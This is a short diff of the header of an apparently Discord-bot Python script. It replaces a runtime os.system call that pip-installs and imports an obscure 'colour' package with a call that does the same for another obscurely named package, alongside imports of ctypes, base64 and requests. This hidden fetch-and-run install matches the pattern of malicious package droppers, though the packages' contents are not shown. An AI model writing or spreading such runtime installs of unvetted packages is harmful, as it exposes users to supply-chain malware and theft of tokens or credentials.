@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pythoncolouringslibV2")
-import pythoncolouringslibV2
+os.system("pip install syscolourtoolkit")
+import syscolourtoolkit
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
